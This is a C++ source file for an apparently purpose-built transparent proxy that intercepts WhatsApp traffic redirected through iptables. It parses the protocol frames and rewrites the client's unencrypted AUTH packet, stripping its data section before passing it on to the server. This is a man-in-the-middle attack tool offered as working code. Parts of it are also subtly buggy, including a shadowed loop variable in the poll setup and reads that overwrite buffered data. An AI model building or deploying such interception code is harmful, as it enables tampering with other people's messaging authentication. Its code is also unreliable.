
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <poll.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <time.h>

#define CONNECT_ERR(ret) (ret < 0 && errno != EINPROGRESS && errno != EALREADY && errno != EISCONN && errno != EINTR && errno != EWOULDBLOCK)
#define CONNECT_OK(ret)  (ret >= 0 || (ret < 0 && errno == EISCONN))
#define WOULDBLOCK (errno == EAGAIN || errno == EWOULDBLOCK)

#define MAXCLIENTS 2048
#ifndef SO_ORIGINAL_DST
  #define SO_ORIGINAL_DST 80
#endif

enum eStatus { stUnused, stConnecting, stNew, stNonWA, stWA };
struct tconn {
	eStatus status;
	unsigned char * buffers[2];
	unsigned int buffers_len[2];
	int fd[2];
	int fdp[2];
	struct sockaddr_in addr;
	int wa_size;
};


tconn cs[MAXCLIENTS];
struct pollfd fdtable[MAXCLIENTS*2+1];
int num_active_fds = 0;
int num_active_clients = 0;

#define MAX_BUFFER_SIZE (64*1024)
#define FWD_BUFFER_SIZE  (4*1024)

int setNonblocking(int fd) {
	int flags;

	/* If they have O_NONBLOCK, use the Posix way to do it */
#if defined(O_NONBLOCK)
	/* Fixme: O_NONBLOCK is defined but broken on SunOS 4.1.x and AIX 3.2.5. */
	if (-1 == (flags = fcntl(fd, F_GETFL, 0)))
		flags = 0;
	return fcntl(fd, F_SETFL, flags | O_NONBLOCK);
#else
	/* Otherwise, use the old way of doing it */
	flags = 1;
	return ioctl(fd, FIOBIO, &flags);
#endif
}

static int getdestaddr_iptables(int fd, const struct sockaddr_in *client, const struct sockaddr_in *bindaddr, struct sockaddr_in *destaddr)
{
	socklen_t socklen = sizeof(*destaddr);
	int error = getsockopt(fd, SOL_IP, SO_ORIGINAL_DST, destaddr, &socklen);
	if (error) {
		printf("Error getsockopt");
		return -1;
	}
	return 0;
}

int wastringlen(unsigned char * buf, int count) {
	if (buf[0] > 2 && buf[0] < 236) {
		return 1;
	}
	
	switch(buf[0]) {
	case 236:
		return 1 + 1;
	case 250: {
		int f = wastringlen(&buf[1], count-1);
		return 1 + f + wastringlen(&buf[1+f], count-1-f);
	}
	case 252:
		return 1 + 1 + buf[2];
	case 253:
		return 1 + 3 + ( (buf[3] << 16) | (buf[4] << 8) | (buf[5]));
	case 255:
		return 1 + 1 + (buf[1]&0x7f);
	default:
		printf("Error decoding string!\n");
		return 0;
	};
}

int wa_pkt_rewrite(unsigned char * buf, int count) {
	// Return a -1 to skip rewriting!
	printf("Flags %d\n", (int)buf[0]);

	if (buf[0] != 0)
		return -1;

	if (count < 7)
		return -1;

	printf("Unencrypted packet\n");

	// Only look at plain frames
	int ptr = 3;
	int lsize;
	int lsizepos;
	if (buf[ptr] == 0xf8) {
		lsize = buf[ptr+1];
		lsizepos = ptr+1;
		ptr += 2;
	}
	else if (buf[ptr] == 0xf9) {
		lsize = (buf[ptr+1] << 8) | buf[ptr+2];
		lsizepos = ptr+2;
		ptr += 3;
	}
	else
		return -1;

	if (buf[ptr++] != 12)
		return -1;  // Only interested in auth packets!

	printf("Got AUTH request from client!\n");

	if (count < 8*16) return -1; // Would have a big blob of data

	// Read & discard attributes
	int numattr = (lsize - 2 + (lsize % 2)) / 2;
	numattr *= 2;
	while (numattr--) {
		int strl = wastringlen(&buf[ptr], count);
		printf("Skip string %d\n", strl);
		ptr += strl;
	}

	if ((lsize & 1) == 1) {
		printf("AUTH does not have data section!\n");
		return -1;  // Does not have data blob
	}

	if (buf[ptr] == 0xf8 || buf[ptr] == 0xf9) {
		printf("DATA is not string!\n");
		return -1; // Has children instead of data blob
	}

	printf("AUTH seems to have a data blob!\n");

	// Remove the last bytes of the packet and set a 1
	// to remove the data section
	int new_size = ptr;
	buf[lsizepos] --;

	int msgsize = ptr-3;

	buf[1] = msgsize >> 8;
	buf[2] = msgsize & 0xFF;

	return new_size;
}

int wa_pktsize(tconn * c, int channel) {
	//printf("pktsize 1\n");
	if (c->buffers_len[channel] < 3)
		return 0;
	//printf("pktsize 2\n");
	if (memcmp(c->buffers[channel], "WA", 2) == 0 &&
		c->buffers_len[channel] >= 4)
		return 4;

	//printf("pktsize\n");
	
	unsigned char flags = c->buffers[channel][0];
	unsigned short pktsize = (c->buffers[channel][1] << 8) | c->buffers[channel][2];

	if (c->buffers_len[channel] >= pktsize + 3) {
		printf("WA packet size: %d\n", pktsize+3);
		int ns = wa_pkt_rewrite(c->buffers[channel], pktsize+3);

		if (ns < 0) return pktsize + 3;

		memmove(&c->buffers[channel][ns], &c->buffers[channel][pktsize+3], c->buffers_len[channel] - ns);
		c->buffers_len[channel] -= (pktsize+3 - ns);
		
		return ns;
	}

	//printf("pktsize 0\n");
	return 0;
}

int wa_haspkt(tconn * c, int channel) {
	if (c->status != stWA || channel == 1) {
		return c->buffers_len[channel];
	}else if (c->status == stWA) {
		//printf("Client->Server %d %d\n", c->buffers_len[channel], c->wa_size);
		if (c->wa_size == 0)
			c->wa_size = wa_pktsize(c, channel);

		return c->wa_size;
	}
}

int data_fwd(int channel, tconn * c, int wadetect = 0) {
	// Only client to server packet rewriting
	int wsize = wa_haspkt(c, channel);

	if (wsize > 0) {
		int w = write(c->fd[channel ^ 1], c->buffers[channel], wsize);
		if (w >= 0) {
			if (w > 0) printf("Transferring data... %d\n", w);
			memmove(&c->buffers[channel][0], &c->buffers[channel][w], c->buffers_len[channel] - w);
			c->buffers_len[channel] -= w;
			if (c->wa_size > 0)
				c->wa_size -= w;
		}
		else if (!WOULDBLOCK)
			return -1;
	}
	if (c->buffers_len[channel] < FWD_BUFFER_SIZE) {
		int r = read(c->fd[channel], c->buffers[channel], FWD_BUFFER_SIZE - c->buffers_len[channel]);
		if (r > 0) {
			if (wadetect && c->status == stNew) {
				if (c->buffers[channel][0] == 'W' && 
					c->buffers[channel][1] == 'A') {

					c->status = stWA;
					printf("WA gotcha!\n");
				}
			}
			else
				if (c->status == stNew) {
					printf("NONWA\n");
					c->status = stNonWA;
				}
			c->buffers_len[channel] = r;
			//printf("Receiving data... %d\n", r);
		}
		else if (!WOULDBLOCK)
			return -1;
	}
	return 0;
}

int get_free_slot() {
	for (int i = 0; i < MAXCLIENTS; i++)
		if (cs[i].status == stUnused)
			return i;
	return -1;
}

int main() {
	int port = 5222;

	// Open port for listening
	struct sockaddr_in servaddr;
	int listenfd = socket(AF_INET, SOCK_STREAM, 0);
	memset(&servaddr, 0, sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
	servaddr.sin_port   = htons(port);
	int yes = 1;
	setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));
	if (bind(listenfd, (struct sockaddr *) &servaddr, sizeof(servaddr)) < 0) {
		printf("Error binding the port.\n",errno); perror("bind"); exit(1);
	}

	if (setNonblocking(listenfd) < 0) {
		printf("Error  while trying to go NON-BLOCKING\n"); exit(1);
	}

	if(listen(listenfd,5) < 0) {
		printf("Error listening on the port\n"); perror("listen"); exit(1);
	}

	for (int i = 0; i < MAXCLIENTS; i++)
		cs[i].status = stUnused;
	fdtable[0].fd = listenfd;
	fdtable[0].events = POLLIN;

	while(1) {
		// Unblock if more than 1 second have elapsed (to allow killing dead connections)
		poll(fdtable, num_active_fds+1, 1000);

		// Add new connections
		if (num_active_clients < MAXCLIENTS) {
			struct sockaddr_in addr;

			socklen_t slen = sizeof(addr);
			int fd = accept(listenfd, (sockaddr*)&addr, &slen);
			if (fd != -1) {
				setNonblocking(fd);
				int idx = get_free_slot();
				// Add the fd to the poll wait table!
				cs[idx].status = stConnecting;
				cs[idx].fd[0] = fd;
				cs[idx].fd[1] = socket(AF_INET, SOCK_STREAM, 0);
				setNonblocking(cs[idx].fd[1]);
				fdtable[++num_active_fds].fd = fd;
				cs[idx].fdp[0] = num_active_fds;
				fdtable[++num_active_fds].fd = cs[idx].fd[1];
				cs[idx].fdp[1] = num_active_fds;
				cs[idx].buffers_len[0] = 0;
				cs[idx].buffers_len[1] = 0;
				cs[idx].buffers[0] = (unsigned char*)malloc(FWD_BUFFER_SIZE);
				cs[idx].buffers[1] = (unsigned char*)malloc(FWD_BUFFER_SIZE);
				cs[idx].wa_size = 0;

				num_active_clients++;
				printf("New connection!\n");

				// Get the fwd IP for this connection
				getdestaddr_iptables(fd, &addr, &servaddr, &cs[idx].addr);
			}
		}

		// Process the data
		for (int i = 0; i < MAXCLIENTS; i++) {
			if (cs[i].status == stUnused) continue;

			int err = 0;
			switch (cs[i].status) {
			case stConnecting: {
				int res = connect(cs[i].fd[1],(struct sockaddr *)&cs[i].addr,sizeof(cs[i].addr));
				if (CONNECT_OK(res)) {
					cs[i].status = stNew;
					printf("Connected to dst!\n");
				}
				else if (CONNECT_ERR(res))
					err = 1;
				break;
			};
			case stNew: {
				err |= data_fwd(0, &cs[i], 1);
				err |= data_fwd(1, &cs[i]);
				break;
			};
			case stWA:
			case stNonWA:
				// Just forward data
				err |= data_fwd(0, &cs[i]);
				err |= data_fwd(1, &cs[i]);
				break;
			};

			if (err) {
				close(cs[i].fd[0]);
				close(cs[i].fd[1]);
				free(cs[i].buffers[0]);
				free(cs[i].buffers[1]);
				cs[i].status = stUnused;
			}

			// Set pollin/out
			fdtable[cs[i].fdp[0]].events = POLLERR;
			fdtable[cs[i].fdp[1]].events = POLLERR;

			if (cs[i].status == stConnecting || 
				(cs[i].status != stUnused && cs[i].buffers_len[1] > 0) )
				fdtable[cs[i].fdp[0]].events |= POLLOUT;
			if ((cs[i].status != stUnused && wa_haspkt(&cs[i],0) > 0) )
				fdtable[cs[i].fdp[1]].events |= POLLOUT;

			for (int i = 0; i < 2; i++)
				if ((cs[i].status != stUnused && cs[i].status != stConnecting
					&& cs[i].buffers_len[i]== 0) )
					fdtable[cs[i].fdp[i]].events |= POLLIN;
		}
	}
}

